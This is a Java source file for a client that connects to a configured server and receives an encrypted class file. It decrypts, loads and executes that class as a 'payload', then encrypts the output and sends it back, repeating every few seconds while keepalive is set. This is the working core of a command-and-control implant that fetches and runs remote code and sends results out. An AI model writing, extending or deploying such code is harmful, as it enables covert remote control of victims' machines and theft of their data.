import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.concurrent.ScheduledExecutorService;

public class Client {

    private static Client inst = null;
    private final int REFRESH = 3000; // millis
    private final int RETRY = 3000; // millis
    private final Settings settings = Settings.getInstance();
    Encryption cipher = null;
    ScheduledExecutorService scheduler;
    private Socket socket = null;

    public Client() {
    }

    public static Client getInstance() {
        if (inst == null)
            inst = new Client();

        return inst;
    }


    private void connect(String address, int port) {
        while (!connectedSocket()) {
            try {
                System.out.println(String.format("Connecting to %s:%d", address, port));
                socket = new Socket(address, port);
            } catch (IOException e) {
                System.out.println(String.format("Error connecting to server %s:%d. Retrying in %d seconds...",
                        settings.getAddress(), settings.getPort(), RETRY / 1000));
                try {
                    Thread.sleep(RETRY);
                } catch (InterruptedException ex) {
                    throw new RuntimeException(ex);
                }
            }
        }
    }


    private boolean connectedSocket() {
        return (socket != null && socket.isConnected() && !socket.isClosed());

    }

    public void run() {

        try {
            // Initialize encryption instance
            cipher = new Encryption(settings.getKey());

            BufferedInputStream in = null;
            BufferedOutputStream out = null;

            do {
                // Connect to server (retry if fails)
                connect(settings.getAddress(), settings.getPort());

                in = new BufferedInputStream(socket.getInputStream());
                out = new BufferedOutputStream(socket.getOutputStream());

                // Allocate space to store data received from server
                byte[] buffer = new byte[4096];
                ByteArrayOutputStream byteArrayStream = new ByteArrayOutputStream();

                // Receive classfile from server
                try {
                    byteArrayStream.write(buffer, 0, in.read(buffer));
                } catch (Exception e) {
                    System.out.println("Error receiving data from server");
                    socket.close();
                    socket = null;
                    continue;
                }

                System.out.println(String.format("Received %d bytes from server",
                        byteArrayStream.size()));

                // Load the received class
                LoadClass loader = new LoadClass(settings.getClassName(),
                        settings.getClassMethod(),
                        cipher.decrypt(byteArrayStream.toByteArray()));

                // Execute the payload and store the text output
                String output = loader.load();
                System.out.println("Output from invoked class method: " + output);

                // Encrypt the output and send back to server
                byte[] byteArrayOutput = cipher.encrypt(output.getBytes());
                out.write(cipher.encrypt(output.getBytes()));
                out.flush();

                System.out.println(String.format("Sent %d bytes to server", byteArrayOutput.length));

                Thread.sleep(REFRESH);
            } while (settings.getKeepalive());

            in.close();
            out.close();
            socket.close();

        } catch (IOException | InterruptedException e) {
            throw new RuntimeException(e);
        }

    }

}
